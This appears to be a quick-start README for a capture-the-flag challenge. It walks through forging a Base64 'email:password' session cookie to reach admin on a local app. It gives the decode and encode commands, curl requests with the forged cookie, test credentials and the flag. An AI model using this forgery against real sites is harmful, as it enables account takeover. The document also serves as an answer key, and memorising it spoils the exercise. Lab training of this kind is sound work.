# Quick Start - Session Cookie Challenge

## TL;DR
1. Login with `guest@vault.dev` / `guest123`
2. Open DevTools → Application → Cookies
3. Decode the `session` cookie (it's Base64)
4. Discover it's `email:password`
5. Encode `admin@vault.dev:admin123` as Base64
6. Replace your session cookie with the admin one
7. Go to Profile page → Click "Check for Flag"
8. Get: `CTF{b4s3_64_s3ss10n_f0rg3ry}`

## Quick Commands

### Decode Cookie
```bash
# Bash (example guest cookie)
echo "Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz" | base64 -d

# PowerShell
[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz"))

# Browser Console
atob("Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz")
```

### Forge Admin Cookie
```bash
# Bash
echo -n "admin@vault.dev:admin123" | base64

# PowerShell
[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("admin@vault.dev:admin123"))

# Browser Console
btoa("admin@vault.dev:admin123")
```

Result: `YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz`

## Accessing the Challenge

1. **Start Server:**
   ```bash
   npm start
   ```

2. **Visit:** http://localhost:3000/login.html

3. **Login with guest credentials** (shown on login page)

4. **Navigate to Profile page** after login

5. **Click "Check for Flag 🚩"** button

## Test Accounts

| Email | Password | Role | Cookie Value (base64) |
|----------|----------|------|--------------|
| guest@vault.dev | guest123 | guest | `Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz` |
| admin@vault.dev | admin123 | admin | `YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz` |

## API Endpoints

Direct API access for testing:

```bash
# Check flag (as guest - no flag)
curl http://localhost:3000/api/profile/flag \
  -H "Cookie: session=Z3Vlc3RAdmF1bHQuZGV2Omd1ZXN0MTIz"

# Check flag (as admin - GET FLAG!)
curl http://localhost:3000/api/flag/session \
  -H "Cookie: session=YWRtaW5AdmF1bHQuZGV2OmFkbWluMTIz"
```

## Flag Location

The flag appears in the **Profile** page when clicking "Check for Flag" button with an admin session cookie.

**Flag:** `CTF{b4s3_64_s3ss10n_f0rg3ry}`
